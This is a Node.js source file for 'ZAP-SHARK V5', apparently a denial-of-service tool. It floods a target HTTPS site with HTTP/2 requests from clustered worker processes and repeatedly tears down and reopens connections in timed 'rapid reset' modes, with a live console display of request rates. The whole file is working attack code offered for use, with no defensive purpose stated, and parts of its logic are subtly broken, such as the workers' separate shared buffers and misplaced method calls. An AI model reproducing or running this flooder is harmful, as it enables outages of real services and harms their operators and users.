const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http2 = require('http2');
const os = require('os');
const cluster = require('cluster');
const { exec } = require('child_process');

class ZAPSHARK_V5 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        
        if (cluster.isMaster) {
            this.startMaster();
        } else {
            this.startWorker();
        }
    }

    // === MASTER PROCESS ===
    startMaster() {
        console.log('=== ZAP-SHARK V5 - MULTI-PROCESS CLUSTER ===');
        console.log('Target:', this.targetUrl);
        console.log('Cores:', os.cpus().length);
        console.log('='.repeat(60));
        
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.status = "ATTACKING";
        this.running = true;
        
        // MEMORY BYPASS SYSTEM
        this.sharedBuffer = new SharedArrayBuffer(1024 * 1024); // 1MB shared memory
        this.statsView = new Int32Array(this.sharedBuffer);
        
        // WORKER MANAGEMENT
        this.workers = [];
        this.workerCount = Math.min(os.cpus().length, 8); // Use up to 8 cores
        
        // RAPID RESET MODES
        this.resetModes = [
            { name: "PREMIUM", interval: 50, duration: 60000 },
            { name: "VIP", interval: 500, duration: 60000 },
            { name: "NORMAL", interval: 850, duration: 60000 }
        ];
        this.currentModeIndex = 0;
        this.modeStartTime = Date.now();
        
        // SPIN UP WORKERS
        for (let i = 0; i < this.workerCount; i++) {
            const worker = cluster.fork({
                WORKER_ID: i,
                TARGET_URL: this.targetUrl,
                SHARED_BUFFER: this.sharedBuffer
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    this.statsView[i * 4] = msg.requests;
                    this.statsView[i * 4 + 1] = msg.rps;
                    this.statsView[i * 4 + 2] = msg.connections;
                    this.statsView[i * 4 + 3] = msg.status;
                }
            });
            
            this.workers.push(worker);
        }
        
        // START CONTROL SYSTEMS
        this.startControlSystems();
        
        console.log(`[+] Launched ${this.workerCount} worker processes`);
        console.log(`[+] Mode: ${this.resetModes[this.currentModeIndex].name}`);
    }

    startControlSystems() {
        // MODE ROTATION (EVERY 1 MIN)
        setInterval(() => {
            this.currentModeIndex = (this.currentModeIndex + 1) % this.resetModes.length;
            const mode = this.resetModes[this.currentModeIndex];
            
            // BROADCAST MODE CHANGE TO ALL WORKERS
            this.workers.forEach(worker => {
                worker.send({ 
                    type: 'mode_change',
                    mode: mode.name,
                    interval: mode.interval
                });
            });
            
            this.modeStartTime = Date.now();
            
        }, 60000); // 1 minute rotation
        
        // STATS AGGREGATION
        setInterval(() => {
            this.aggregateStats();
            this.updateDisplay();
        }, 100);
        
        // WATCHDOG
        setInterval(() => {
            this.checkWorkerHealth();
        }, 5000);
        
        process.on('SIGINT', () => this.shutdown());
    }

    aggregateStats() {
        let totalReqs = 0;
        let totalRPS = 0;
        let totalConns = 0;
        
        for (let i = 0; i < this.workerCount; i++) {
            totalReqs += Atomics.load(this.statsView, i * 4);
            totalRPS += Atomics.load(this.statsView, i * 4 + 1);
            totalConns += Atomics.load(this.statsView, i * 4 + 2);
        }
        
        this.totalRequests = totalReqs;
        this.currentRPS = totalRPS;
        
        // UPDATE TOTAL REQUESTS IN SHARED MEMORY (LAST SLOT)
        Atomics.store(this.statsView, this.workerCount * 4, totalReqs);
    }

    checkWorkerHealth() {
        this.workers.forEach((worker, index) => {
            const lastUpdate = Atomics.load(this.statsView, index * 4 + 3);
            if (lastUpdate === 0 && worker.isConnected()) {
                // WORKER STUCK - RESTART
                console.log(`[!] Restarting stuck worker ${index}`);
                worker.kill();
                this.restartWorker(index);
            }
        });
    }

    restartWorker(index) {
        setTimeout(() => {
            const worker = cluster.fork({
                WORKER_ID: index,
                TARGET_URL: this.targetUrl,
                SHARED_BUFFER: this.sharedBuffer
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    this.statsView[index * 4] = msg.requests;
                    this.statsView[index * 4 + 1] = msg.rps;
                    this.statsView[index * 4 + 2] = msg.connections;
                    this.statsView[index * 4 + 3] = msg.status;
                }
            });
            
            this.workers[index] = worker;
        }, 1000);
    }

    updateDisplay() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const mode = this.resetModes[this.currentModeIndex];
        const modeTimeLeft = 60000 - (Date.now() - this.modeStartTime);
        const modeSeconds = Math.ceil(modeTimeLeft / 1000);
        
        const totalConnections = this.workers.reduce((sum, _, idx) => 
            sum + Atomics.load(this.statsView, idx * 4 + 2), 0);
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V5 - MULTI-PROCESS ===`);
        console.log(`RUNTIME: ${runtimeStr} | WORKERS: ${this.workerCount} | MODE: ${mode.name}`);
        console.log(`MODE SWITCH IN: ${modeSeconds}s | RESET INTERVAL: ${mode.interval}ms`);
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${this.totalRequests.toLocaleString()}`);
        console.log(`CURRENT RPS: ${this.currentRPS.toFixed(1)}`);
        console.log(`TOTAL CONNECTIONS: ${totalConnections}`);
        console.log('='.repeat(60));
        console.log('WORKER STATS:');
        
        // INDIVIDUAL WORKER STATS
        for (let i = 0; i < this.workerCount; i++) {
            const workerReqs = Atomics.load(this.statsView, i * 4);
            const workerRPS = Atomics.load(this.statsView, i * 4 + 1);
            const workerConns = Atomics.load(this.statsView, i * 4 + 2);
            const workerStatus = Atomics.load(this.statsView, i * 4 + 3);
            
            console.log(`Worker ${i}: ${workerReqs.toLocaleString()} reqs | ${workerRPS.toFixed(1)} RPS | ${workerConns} conns | ${workerStatus ? 'ACTIVE' : 'STUCK'}`);
        }
        console.log('='.repeat(60));
    }

    shutdown() {
        console.log('\n\n=== SHUTTING DOWN V5 ===');
        console.log(`Final Requests: ${this.totalRequests.toLocaleString()}`);
        console.log(`Final RPS: ${this.currentRPS.toFixed(1)}`);
        console.log(`Runtime: ${Math.floor((Date.now() - this.startTime) / 1000)}s`);
        console.log('='.repeat(40));
        
        this.workers.forEach(worker => worker.kill());
        process.exit(0);
    }

    // === WORKER PROCESS ===
    startWorker() {
        const workerId = process.env.WORKER_ID;
        const targetUrl = process.env.TARGET_URL;
        
        // ACCESS SHARED MEMORY
        const sharedBuffer = new SharedArrayBuffer(1024 * 1024);
        const statsView = new Int32Array(sharedBuffer);
        const myOffset = workerId * 4;
        
        let totalRequests = 0;
        let requestsSinceLastCalc = 0;
        let lastRpsCalc = Date.now();
        let currentRPS = 0;
        
        // WORKER CONNECTION POOL
        const connectionPool = [];
        const connCount = 10;
        let resetInterval = 850; // DEFAULT
        
        // INITIALIZE CONNECTIONS
        for (let i = 0; i < connCount; i++) {
            this.createConnection(connectionPool);
        }
        
        // LISTEN FOR MODE CHANGES FROM MASTER
        process.on('message', (msg) => {
            if (msg.type === 'mode_change') {
                resetInterval = msg.interval;
            }
        });
        
        // MAIN WORKER LOOP
        const workerLoop = setInterval(() => {
            // SEND REQUESTS
            this.sendRequests(connectionPool);
            
            // UPDATE STATS
            this.updateWorkerStats();
            
            // RAPID RESET
            this.performRapidReset(connectionPool, resetInterval);
            
        }, 0.1);
        
        function updateWorkerStats() {
            const now = Date.now();
            const timeDiff = (now - lastRpsCalc) / 1000;
            
            if (timeDiff >= 0.9) {
                currentRPS = requestsSinceLastCalc / timeDiff;
                requestsSinceLastCalc = 0;
                lastRpsCalc = now;
                
                // UPDATE SHARED MEMORY
                Atomics.store(statsView, myOffset, totalRequests);
                Atomics.store(statsView, myOffset + 1, Math.round(currentRPS * 10));
                Atomics.store(statsView, myOffset + 2, connectionPool.length);
                Atomics.store(statsView, myOffset + 3, 1); // ACTIVE STATUS
                
                // SEND TO MASTER (BACKUP)
                if (process.send) {
                    process.send({
                        type: 'stats',
                        requests: totalRequests,
                        rps: currentRPS,
                        connections: connectionPool.length,
                        status: 1
                    });
                }
            }
        }
        
        process.on('SIGINT', () => {
            clearInterval(workerLoop);
            connectionPool.forEach(conn => {
                try { conn.client.destroy(); } catch (e) {}
            });
        });
    }

    createConnection(pool) {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 8192
            });
            
            client.setMaxListeners(100);
            client.on('error', () => {});
            
            pool.push({
                client,
                created: Date.now(),
                requests: 0
            });
        } catch (err) {}
    }

    sendRequests(pool) {
        if (pool.length === 0) return;
        
        const batchSize = Math.min(10, pool.length * 2);
        
        for (let i = 0; i < batchSize; i++) {
            const conn = pool[Math.floor(Math.random() * pool.length)];
            if (!conn) continue;
            
            try {
                const req = conn.client.request({
                    ':method': 'GET',
                    ':path': '/',
                    ':authority': this.hostname
                });
                
                conn.requests++;
                
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    // UPDATE THROUGH CLOSURE
                    if (typeof this.totalRequests !== 'undefined') {
                        this.totalRequests++;
                        this.requestsSinceLastCalc++;
                    }
                });
                
                req.end();
                
            } catch (err) {
                if (typeof this.totalRequests !== 'undefined') {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                }
            }
        }
    }

    performRapidReset(pool, interval) {
        const now = Date.now();
        if (now - this.lastReset >= interval) {
            const resetCount = Math.ceil(pool.length * 0.3);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * pool.length);
                if (pool[index]) {
                    try {
                        pool[index].client.destroy();
                        this.createConnection(pool);
                    } catch (err) {}
                }
            }
            
            this.lastReset = now;
        }
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v5.js https://target.com');
    process.exit(1);
}

// INCREASE MEMORY LIMIT FOR MASTER
if (cluster.isMaster) {
    process.env.UV_THREADPOOL_SIZE = 64;
}

const shark = new ZAPSHARK_V5(target);
